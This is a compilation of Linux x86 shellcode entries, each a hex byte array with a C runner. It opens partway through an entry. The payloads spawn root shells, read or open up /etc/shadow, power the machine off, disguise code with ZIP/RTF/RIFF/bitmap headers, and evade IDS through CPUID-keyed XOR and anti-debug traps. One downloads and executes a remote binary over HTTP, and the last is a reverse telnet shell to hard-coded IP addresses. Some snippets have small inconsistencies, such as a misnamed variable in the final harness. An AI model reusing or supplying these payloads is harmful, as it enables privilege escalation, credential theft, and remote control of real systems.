"\x75\xf6\xeb\x18\x5e\x89\x75\x08\x31\xc0\x88\x46\x07\x89\x45\x0c"
"\xb0\x0b\x89\xf3\x8d\x4d\x08\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff"
"\xff/bin/sh";


main()
{
  int (*funct)();
  funct = (int (*)()) code;
  printf("%s shellcode\n\tSize = %d\n",NAME,strlen(code));
  (int)(*funct)();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 Title: linux/x86 Shellcode execve ("/bin/sh") - 21 Bytes
 Date     : 10 Feb 2011
 Author   : kernel_panik
 Thanks   : cOokie, agix, antrhacks
*/

/*
 xor ecx, ecx
 mul ecx
 push ecx
 push 0x68732f2f   ;; hs//
 push 0x6e69622f   ;; nib/
 mov ebx, esp
 mov al, 11
 int 0x80
*/


#include <stdio.h>
#include <string.h>

char code[] = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
              "\x73\x68\x68\x2f\x62\x69\x6e\x89"
              "\xe3\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
 printf ("Shellcode length : %d bytes\n", strlen (code));
 int(*f)()=(int(*)())code;
 f();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include <stdio.h>
 
/*
    linux/x86 ; setuid(0) & execve("/sbin/poweroff -f") 47 bytes
    written by ka0x - <ka0x01[alt+64]gmail.com>
    lun sep 21 16:40:16 CEST 2009
 
    greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek, Hendrix and others!
*/
 
int main()
{
    char shellcode[] =
            "\x31\xdb"      // xor ebx,ebx
            "\x6a\x17"      // push byte 0x17
            "\x58"          // pop eax
            "\xcd\x80"      // int 80h
            "\x8d\x43\x0b"      // lea eax,[ebx+0xb]
            "\x99"          // cdq
            "\x52"          // push edx
            "\x66\x68\x66\x66"  // push word 0x6666
            "\x68\x77\x65\x72\x6f"  // push dword 0x6f726577
            "\x68\x6e\x2f\x70\x6f"  // push dword 0x6f702f6e
            "\x68\x2f\x73\x62\x69"  // push dword 0x6962732f
            "\x89\xe3"      // mov ebx,esp
            "\x52"          // push edx
            "\x66\x68\x2d\x66"  // push word 0x662d
            "\x89\xe1"      // mov ecx,esp
            "\x52"          // push edx
            "\x51"          // push ecx
            "\x53"          // push ebx
            "\x89\xe1"      // mov ecx,esp
            "\xcd\x80" ;        // int 80h
 
    printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
    (*(void(*)()) shellcode)();
     
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
 
/*
    linux/x86 ; setuid(0) & execve(/bin/cat /etc/shadow) 49 bytes
    written by ka0x - <ka0x01[alt+64]gmail.com>
    lun sep 21 16:40:16 CEST 2009
 
    greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!
*/
 
int main()
{
    char shellcode[] =
            "\x31\xdb"      // xor ebx,ebx
            "\x6a\x17"      // push byte 17h   
            "\x58"          // pop eax
            "\xcd\x80"      // int 0x80
            "\x8d\x43\x0b"      // lea eax,[ebx+0xb]
            "\x99"          // cdq
            "\x52"          // push edx
            "\x68\x2f\x63\x61\x74"  // push dword 0x7461632f
            "\x68\x2f\x62\x69\x6e"  // push dword 0x6e69622f
            "\x89\xe3"      // mov ebx,esp
            "\x52"          // push edx
            "\x68\x61\x64\x6f\x77"  // push dword 0x776f6461
            "\x68\x2f\x2f\x73\x68"  // push dword 0x68732f2f
            "\x68\x2f\x65\x74\x63"  // push dword 0x6374652f
            "\x89\xe1"      // mov ecx,esp
            "\x52"          // push edx
            "\x51"          // push ecx
            "\x53"          // push ebx
            "\x89\xe1"      // mov ecx,esp
            "\xcd\x80" ;        // int 80h
 
    printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
    (*(void(*)()) shellcode)();
     
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
 
/*
    linux/x86 ; chmod(/etc/shadow, 0666) & exit() 33 bytes
    written by ka0x - <ka0x01[alt+64]gmail.com>
    lun sep 21 17:13:25 CEST 2009
 
    greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!
 
*/
 
int main()
{
 
    char shellcode[] =
            "\x31\xc0"          // xor eax,eax
            "\x50"              // push eax
            "\x68\x61\x64\x6f\x77"      // push dword 0x776f6461
            "\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f
            "\x68\x2f\x65\x74\x63"      // push dword 0x6374652f
            "\x89\xe3"          // mov ebx,esp
            "\x66\x68\xb6\x01"      // push word 0x1b6
            "\x59"              // pop ecx
            "\xb0\x0f"          // mov al,0xf
            "\xcd\x80"          // int 0x80
            "\xb0\x01"          // mov al,0x1
            "\xcd\x80";         // int 0x80
 
    printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
    (*(void(*)()) shellcode)();
     
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) quick (yet conditional, eax != 0 and edx == 0) exit - 4 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] = 

	"\xf7\xf0"              // div %eax 
	"\xcd\x80";             // int $0x80

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) 24/7 open cd-rom loop (follows "/dev/cdrom" symlink) - 39 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] = 

	"\x6a\x05"              // push $0x5 
	"\x58"                  // pop %eax 
	"\x31\xc9"              // xor %ecx,%ecx 
	"\x51"                  // push %ecx 
	"\xb5\x08"              // mov $0x8,%ch 
	"\x68\x64\x72\x6f\x6d"  // push $0x6d6f7264 
	"\x68\x65\x76\x2f\x63"  // push $0x632f7665 
	"\x68\x2f\x2f\x2f\x64"  // push $0x642f2f2f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\xcd\x80"              // int $0x80 
	"\x89\xc3"              // mov %eax,%ebx 
	"\x66\xb9\x09\x53"      // mov $0x5309,%cx 
	
	//
	// <_openit>:
	//

	"\xb0\x36"              // mov $0x36,%al 
	"\xcd\x80"              // int $0x80 
	"\xeb\xfa";             // jmp <_openit>

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}






////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) - execve("/bin/sh", ["/bin/sh"], NULL) / encoded by +1 - 39 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] = 

	"\x68\x8a\xe2\xce\x81"  // push $0x81cee28a 
	"\x68\xb1\x0c\x53\x54"  // push $0x54530cb1 
	"\x68\x6a\x6f\x8a\xe4"  // push $0xe48a6f6a 
	"\x68\x01\x69\x30\x63"  // push $0x63306901 
	"\x68\x69\x30\x74\x69"  // push $0x69743069 
	"\x6a\x14"              // push $0x14 
	"\x59"                  // pop %ecx 
	
	//
	// <_unpack_loop>:
	//

	"\xfe\x0c\x0c"          // decb (%esp,%ecx,1) 
	"\x49"                  // dec %ecx 
	"\x79\xfa"              // jns <_unpack_loop> 
	"\x41"                  // inc %ecx 
	"\xf7\xe1"              // mul %ecx 
	"\x54"                  // push %esp 
	"\xc3";                 // ret 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) - execve("/bin/sh", ["/bin/sh", NULL]) + ZIP Header - 28 bytes
 *
 * root@magicbox:~# file linux-sh-ziphdr.bin
 * linux-sh-ziphdr.bin: Zip archive data
 *
 * - izik <izik@tty64.org>
 */

char shellcode[] = 

	//
	// ZIP Header (5 bytes)
	//

	"\x50"                  // push %eax 
	"\x4b"                  // dec %ebx 
	"\x03\x04\x24"          // add (%esp),%eax 

	//
	// execve("/bin/sh", ["/bin/sh", NULL]);
	//

	"\x6a\x0b"              // push $0xb 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\x52"                  // push %edx 
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f 
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80";             // int $0x80 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) - execve("/bin/sh", ["/bin/sh", NULL]) + RTF header - 30 bytes
 *
 * root@magicbox:~# file linux-sh-rtfhdr.bin
 * linux-sh-rtfhdr.bin: Rich Text Format data, version 1,
 *
 * - izik <izik@tty64.org>
 */

char shellcode[] = 

	//
	// RTF Header (7 bytes) 
	// - Be careful not to trigger any of those expressions.
	//

	"\x7b\x5c"              // jnp 80480d2 <_start+0x5e> 
	"\x72\x74"              // jb 80480ec <_start+0x78> 
	"\x66\x31\xc0"          // xor %ax,%ax 

	//
	// execve("/bin/sh", ["/bin/sh", NULL]);
	//

	"\x6a\x0b"              // push $0xb 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\x52"                  // push %edx 
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f 
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80";             // int $0x80 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) - execve("/bin/sh", ["/bin/sh", NULL]) + RIFF Header - 28 bytes
 *
 * root@magicbox:~# file linux-sh-riffhdr.bin
 * linux-sh-riffhdr.bin: RIFF (little-endian) data
 *
 * - izik <izik@tty64.org>
 */

char shellcode[] = 

	//
	// RIFF Header (5 bytes)
	//

	"\x52"                  // push %edx 
	"\x49"                  // dec %ecx 
	"\x46"                  // inc %esi 
	"\x46"                  // inc %esi 
	"\x40"                  // inc %eax 

	//
	// execve("/bin/sh", ["/bin/sh", NULL]);
	//

	"\x6a\x0b"              // push $0xb 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\x52"                  // push %edx 
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f 
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80";             // int $0x80 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) - execve("/bin/sh", ["/bin/sh", NULL]) + Bitmap 24bit Header - 27 bytes
 *
 * root@magicbox:~# file linux-sh-bm24bhdr.bin
 * linux-sh-bm24bhdr.bin: PC bitmap data
 *
 * - izik <izik@tty64.org>
 */

char shellcode[] = 

	//
	// Bitmap 24bit Header (4 bytes)
	//

	"\x42"                  // inc %edx 
	"\x4d"                  // dec %ebp 
	"\x36"                  // ss 
	"\x91"                  // xchg %eax,%ecx 

	//
	// execve("/bin/sh", ["/bin/sh", NULL]);
	//

	"\x6a\x0b"              // push $0xb 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\x52"                  // push %edx 
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f 
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80";             // int $0x80 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) execve("/bin/sh", ["/bin/sh"], NULL) / xor'ed against Intel x86 CPUID - 41 bytes
 *
 * The idea behind this shellcode is to use a *weak* pre-shared secret between the attacker and
 * the attacked machine. So if a 3rd party side would try to run this shellcode and would produce 
 * a different CPUID output (e.g. different arch) the shellcode won't work. In addition this also
 * prevents from having the '/bin/sh' string visible on the wire.
 *
 * The shellcode key is (0x6c65746e, 'letn') and expected to be in %ecx register after CPUID
 * 
 * - izik <izik@tty64.org>
 */

char shellcode[] = 

	"\x31\xc0"              // xor %eax,%eax 
	"\x0f\xa2"              // cpuid 
	"\x51"                  // push %ecx 
	"\x68\xe7\x95\xa8\xec"  // push $0xeca895e7 
	"\x68\xde\x7f\x37\x3f"  // push $0x3f377fde 
	"\x68\x07\x1a\xec\x8f"  // push $0x8fec1a07 
	"\x68\x6e\x1c\x4a\x0e"  // push $0x0e4a1c6e 
	"\x68\x06\x5b\x16\x04"  // push $0x04165b06 

	//
	// <_unpack_loop>:
	//

	"\x31\x0c\x24"          // xor %ecx,(%esp) 
	"\x5a"                  // pop %edx 
	"\x75\xfa"              // jne <_unpack_loop> 
	"\x83\xec\x18"          // sub $0x18,%esp 
	"\x54"                  // push %esp 
	"\xc3";                 // ret 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) eject & close cd-rom frenzy loop (follows "/dev/cdrom" symlink) - 45 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] = 

	"\x6a\x05"              // push $0x5 
	"\x58"                  // pop %eax 
	"\x31\xc9"              // xor %ecx,%ecx 
	"\x51"                  // push %ecx 
	"\xb5\x08"              // mov $0x8,%ch 
	"\x68\x64\x72\x6f\x6d"  // push $0x6d6f7264 
	"\x68\x65\x76\x2f\x63"  // push $0x632f7665 
	"\x68\x2f\x2f\x2f\x64"  // push $0x642f2f2f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\xcd\x80"              // int $0x80 
	"\x89\xc3"              // mov %eax,%ebx 
	
	//
	// <_makeio>:
	//

	"\x66\xb9\x09\x53"      // mov $0x5309,%cx 

	//
	// <_frenzy>:
	//

	"\xb0\x36"              // mov $0x36,%al 
	"\xcd\x80"              // int $0x80 
	"\xf5"                  // cmc 
	"\x72\xf5"              // jc <_makeio>
	"\x80\xc1\x10"          // add $0x10,%cl 
	"\xeb\xf4";             // jmp <_frenzy>

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) cat /dev/urandom > /dev/console, no real profit just for kicks - 63 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] = 

	"\x31\xc9"              // xor %ecx,%ecx 
	"\x51"                  // push %ecx 
	"\x68\x6e\x64\x6f\x6d"  // push $0x6d6f646e 
	"\x68\x2f\x75\x72\x61"  // push $0x6172752f 
	"\x68\x2f\x64\x65\x76"  // push $0x7665642f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\xb1\x02"              // mov $0x2,%cl 

	//
	// <_openit>:
	//

	"\x6a\x05"              // push $0x5 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\xcd\x80"              // int $0x80 
	"\x96"                  // xchg %eax,%esi 
	"\x5f"                  // pop %edi 
	"\x5d"                  // pop %ebp 
	"\x5d"                  // pop %ebp 
	"\x68\x73\x6f\x6c\x65"  // push $0x656c6f73 
	"\x68\x2f\x63\x6f\x6e"  // push $0x6e6f632f 
	"\x57"                  // push %edi 
	"\xe2\xe9"              // loop <_openit>
 
	"\x89\xc3"              // mov %eax,%ebx 

	//
	// <_makeio>:
	//

	"\xb2\x04"              // mov $0x4,%dl 
	"\x89\xe1"              // mov %esp,%ecx 

	//
	// <_pre_ioloop>:
	//

	"\xb0\x03"              // mov $0x3,%al 
	"\xf8"                  // clc 
	
	//
	// <_ioloop>:
	//

	"\xcd\x80"              // int $0x80 
	"\x87\xde"              // xchg %ebx,%esi 
	"\x72\xf7"              // jc <_pre_ioloop> 
	"\xf9"                  // stc 
	"\xeb\xf7";             // jmp <_ioloop> 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) anti-debug trick (INT 3h trap) + execve("/bin/sh", ["/bin/sh", NULL], NULL) - 39 bytes 
 * 
 * The idea behind a shellcode w/ an anti-debugging trick embedded in it, is if for any reason the IDS 
 * would try to x86-emulate the shellcode it would *glitch* and fail. This also protectes the shellcode 
 * from running within a debugger environment such as gdb and strace. 
 *
 * How this works? the shellcode registers for the SIGTRAP signal (aka. Breakpoint Interrupt) and use it 
 * to call the acutal payload (e.g. _evil_code) while a greedy debugger or a confused x86-emu won't pass 
 * the signal handler to the shellcode, it would end up doing _exit() instead execuve() 
 *
 * - izik <izik@tty64.org>
 */

char shellcode[] = 

	"\x6a\x30"              // push $0x30 
	"\x58"                  // pop %eax 
	"\x6a\x05"              // push $0x5 
	"\x5b"                  // pop %ebx 
	"\xeb\x05"              // jmp <_evil_code> 

	//
 	// <_evilcode_loc>:
	//

	"\x59"                  // pop %ecx 
	"\xcd\x80"              // int $0x80 
	"\xcc"                  // int3 
	"\x40"                  // inc %eax 
	"\xe8\xf6\xff\xff\xff"  // call <_evilcode_loc> 
	"\x99"                  // cltd 

	// 
        // <_evil_code>: 
        //

	"\xb0\x0b"              // mov $0xb,%al 
	"\x52"                  // push %edx 
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f 
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\x54"                  // push %esp 
	"\xeb\xe1";             // jmp <_evilcode_loc> 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* (linux/x86) HTTP/1.x GET, Downloads and JMP - 68 bytes+
 *
 * This shellcode allows you to download a binary code straight off a standard HTTP server
 * and execute it. The downloaded shellcode (e.g. binary code) will be executed on the stack.
 *
 * <DEMONSTRATION>:
 *
 * > Starting by creating a very simple shellcode, that will be downloaded and execute.
 * 
 * root@magicbox:/tmp# cat foobar.s
 *	.section .text
 *      .global _start
 *      _start:
 *
 *		movl $0x4, %eax
 *              movl $0x1, %ebx
 *
 *              call _doint
 *                      .ascii "Hello World!"
 *			.byte 0xa
 *              _doint:
 *              popl %ecx
 *              movl $0xd, %edx
 *              int $0x80
 *
 *              movl $0x1, %eax
 *              int $0x80
 *
 *		# Reverse CALL
 *              call _start
 *
 * > The only requirement from the downloaded shellcode, is that it will include a reverse 
 *   CALL to itself. As this shellcode does not parse the HTTP header, it has no way to know 
 *   where the downloaded shellcode begins or ends. Therefor it realys on the downloaded 
 *   shellcode to supply that, by including a CALL in the bottom, which will be JMP into.
 *
 * > Compile the given shellcode 
 *
 * root@magicbox:/tmp# as -o foobar.o foobar.s
 * root@magicbox:/tmp# ld -o foobar foobar.o
 *
 * > Convert this file into a raw binary (headerless, formatless)
 *
 * root@magicbox:/tmp# objcopy -O binary foobar foobar.bin
 *
 * > Host this file, on some HTTP server (I haved used Apache/1.3.34)
 *
 * > Use gen_httpreq.c to generate a URL request (e.g. /foobar.bin)
 *
 * > Paste the gen_httpreq.c output, into this shellcode at the marked place.
 *
 * > Compile this shellcode w/ the gen_httpreq output in it.
 *
 * > Execute this shellcode
 * 
 * root@magicbox:/tmp# gcc -o http-download-jmp http-download-jmp.c
 * root@magicbox:/tmp# ./http-download-jmp
 * Hello World!
 * root@magicbox:/tmp#
 *
 * <LINKS/UTILITIES>:
 *
 *      gen_httpreq.c, generates a HTTP GET request for this shellcode
 *      > http://www.tty64.org/shellcode/utilities/gen_httpreq.c
 *
 * - izik <izik@tty64.org>
 */

char shellcode[] = 

	"\x6a\x66"              // push $0x66 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\x6a\x01"              // push $0x1 
	"\x5b"                  // pop %ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\x6a\x02"              // push $0x2 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80"              // int $0x80 
	"\x5b"                  // pop %ebx 
	"\x5d"                  // pop %ebp 

				//
	"\xbe\x80\xff\xff\xfe"  // mov $0xfeffff80,%esi 
				// (0x0xfeffff80 = ~127.0.0.1)
				//

				//
	"\x66\xbd\x91\x1f"      // mov $0x1f91,%bp 
				// (0x1f91 = 8081/tcp)
				//

	//
	// "\x66\xbd\xaf\xff"	// mov $0xffaf, %bp
	//			// (0xafff = ~0080/tcp)
	// "\x66\xf7\xd5"       // not %bp
	//

	"\xf7\xd6"              // not %esi 
	"\x56"                  // push %esi 
	"\x0f\xcd"              // bswap %ebp 
	"\x09\xdd"              // or %ebx,%ebp 
	"\x55"                  // push %ebp 
	"\x43"                  // inc %ebx 
	"\x6a\x10"              // push $0x10 
	"\x51"                  // push %ecx 
	"\x50"                  // push %eax 
	"\xb0\x66"              // mov $0x66,%al 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80"              // int $0x80 

	//
	// <paste here the code, that gen_httpreq.c outputs!>
	//

	"\x89\xe1"              // mov %esp,%ecx 
	"\xb0\x04"              // mov $0x4,%al 
	"\xcd\x80"              // int $0x80 

	//
	// <_recv_http_request>:
	//

	"\xb0\x03"              // mov $0x3,%al 
	"\x6a\x01"              // push $0x1 
	"\x5a"                  // pop %edx 
	"\xcd\x80"              // int $0x80 
	"\x41"                  // inc %ecx 
	"\x85\xc0"              // test %eax,%eax 
	"\x75\xf4"              // jne <_recv_http_request> 
	"\x83\xe9\x06"          // sub $0x6,%ecx 
	"\xff\xe1";             // jmp *%ecx 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) - HTTP/1.x GET, Downloads and execve() - 111 bytes+
 *
 * This shellcode allows you to download a ELF executable straight off a standard HTTP server
 * and launch it. It will saved locally it into a filename called 'A' in the current directory.
 * 
 * <_CONFIGURATION>
 *
 * > The destination IP of the HTTP server is required (NO DNS!), use inet_addr() function result and 
 *   modify the value in [1*] from 0xdeadbeef to the actual IP, if the IP contains NULLs then a little 
 *   workaround requires. The simplest is to use ~inet_addr() followed by ``notl (%esp)`` to change back. 
 *
 * > The destination port of the HTTP server is 80 by default, it is located within the 4 upper bytes
 *   of the value in [2*] (0xafff). Stored in an invert format (~), so if any further modification 
 *   needed make sure to keep it stored in the same format.
 *
 * > The destination URL should be generated using the ``gen_httpreq`` utility. It will produce an
 *   assembly code which is a series of PUSH's and should be pasted as it is within in the marked place
 *   in the shellcode (look for the comment).
 * 
 * <_LINKS/UTILITIES>:
 *
 *      gen_httpreq.c, generates a HTTP GET request for this shellcode
 *      > http://www.tty64.org/code/shellcodes/utilities/gen_httpreq.c
 *	backup
 *	> http://www.milw0rm.com/shellcode/2618
 *
 * - izik < izik@tty64.org >
 */

char shellcode[] = 

	"\x6a\x66"              // push $0x66 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\x6a\x01"              // push $0x1 
	"\x5b"                  // pop %ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\x6a\x02"              // push $0x2 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80"              // int $0x80 
	"\x5b"                  // pop %ebx 
	"\x5e"                  // pop %esi 
	"\x68\xef\xbe\xad\xde"  // [1*] push $0xdeadbeef
	"\xbd\xfd\xff\xff\xaf"  // [2*] mov $0xaffffffd,%ebp 
	"\xf7\xd5"              // not %ebp 
	"\x55"                  // push %ebp 
	"\x43"                  // inc %ebx 
	"\x6a\x10"              // push $0x10 
	"\x51"                  // push %ecx 
	"\x50"                  // push %eax 
	"\xb0\x66"              // mov $0x66,%al 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80"              // int $0x80 
	"\x5f"                  // pop %edi 
	"\xb0\x08"              // mov $0x8,%al 
	"\x52"                  // push %edx 
	"\x6a\x41"              // push $0x41 
	"\x89\xe3"              // mov %esp,%ebx 
	"\x50"                  // push %eax 
	"\x59"                  // pop %ecx 
	"\xcd\x80"              // int $0x80 
	"\x96"                  // xchg %eax,%esi 
	"\x87\xdf"              // xchg %ebx,%edi 

	//
	// <_paste here the code, that gen_httpreq.c outputs!>
	//

	"\xb0\x04"              // mov $0x4,%al 

	//
	// <_send_http_request>:
	//

	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80"              // int $0x80 
	"\x99"                  // cltd 
	"\x42"                  // inc %edx 

	//
	// <_wait_for_dbl_crlf>:
	//

	"\x49"                  // dec %ecx 
	"\xb0\x03"              // mov $0x3,%al 
	"\xcd\x80"              // int $0x80 
	"\x81\x39\x0a\x0d\x0a\x0d" // cmpl $0xd0a0d0a,(%ecx) 
	"\x75\xf3"              // jne <_wait_for_dbl_crlf> 
	"\xb2\x04"              // mov $0x4,%dl 

	//
	// <_dump_loop_do_read>:
	//

	"\xb0\x03"              // mov $0x3,%al 
	"\xf8"                  // clc 


	//
	// <_dump_loop_do_write>:
	//

	"\xcd\x80"              // int $0x80 
	"\x87\xde"              // xchg %ebx,%esi 
	"\x72\xf7"              // jb <_dump_loop_do_read> 
	"\x85\xc0"              // test %eax,%eax 
	"\x74\x05"              // je <_close_file> 
	"\xb0\x04"              // mov $0x4,%al 
	"\xf9"                  // stc 
	"\xeb\xf1"              // jmp <_dump_loop_do_write> 
	"\xb0\x06"              // mov $0x6,%al 
	"\xcd\x80"              // int $0x80 
	"\x99"                  // cltd 
	"\xb0\x0b"              // mov $0xb,%al 
	"\x89\xfb"              // mov %edi,%ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\xeb\xcc";             // jmp <_send_http_request> 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* execve /bin/sh - x86/linux - 21 bytes . zeroed argv[] / envp[]
  ipv#oldschool@irc.worldnet.net ipv#backtrack-fr@irc.freenode.org
  thanks : `ivan, milo, #oldschool crew
*/
 
int main(){
 
char sc[] = "\x6a\x0b" // push byte +0xb
"\x58" // pop eax
"\x99" // cdq
"\x52" // push edx
"\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f
"\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f
"\x89\xe3" // mov ebx, esp
"\x31\xc9" // xor ecx, ecx
"\xcd\x80"; // int 0x80
 
((void (*)()) sc)();
}
 
/*
sc[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
*/
 
--
ipv



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
   Reverse Telnet Shellcode by hts
*/
/*
        jmp   0x31
        popl  %esi
        movl  %esi,0x4f(%esi)
        leal  0x8(%esi),%ebx
        movl  %ebx,0x53(%esi)
        leal  0xb(%esi),%ebx
        movl  %ebx,0x57(%esi)
        xorl  %eax,%eax
        movb  %eax,0x7(%esi)
        movb  %eax,0xa(%esi)
        movb  %eax,0x4e(%esi)
        movl  %eax,0x5b(%esi)
        movb  $0xb,%al
        movl  %esi,%ebx
        leal  0x4f(%esi),%ecx
        leal  0x5b(%esi),%edx
        int   $0x80
        xorl  %ebx,%ebx
        movl  %ebx,%eax
        inc   %eax
        int   $0x80
        call  -0x36
        .string \"/bin/sh -c /bin/telnet 200.182.207.235 5|/bin/sh|/bin/telnet 200.182.207.235 6\"
*/

char shellcode[] =
        "\xeb\x31\x5e\x89\x76\x4f\x8d\x5e\x08\x89\x5e\x53"
        "\x8d\x5e\x0b\x89\x5e\x57\x31\xc0\x88\x46\x07\x88"
        "\x46\x0a\x88\x46\x4e\x89\x46\x5b\xb0\x0b\x89\xf3"
        "\x8d\x4e\x4f\x8d\x56\x5b\xcd\x80\x31\xdb\x89\xd8"
        "\x40\xcd\x80\xe8\xca\xff\xff\xff/bin/sh -c /bin/"
        "telnet 200.182.207.246 5|/bin/sh|/bin/telnet 200"
        ".182.207.246 6";

#define NAME "Reverse Telnet Shellcode - by hts"

void main(){
  void (*s)() = (void *)hellcode;
  printf("Shellcode length: %d\nExecuting..\n\n", strlen(hellcode));
  s();
}

/* I don't know if exists any reverse telnet shellcode..
 * you should modify your ip addr to use it...
 * to use it, nc -l -p 5 , on another terminal nc -l -p 6
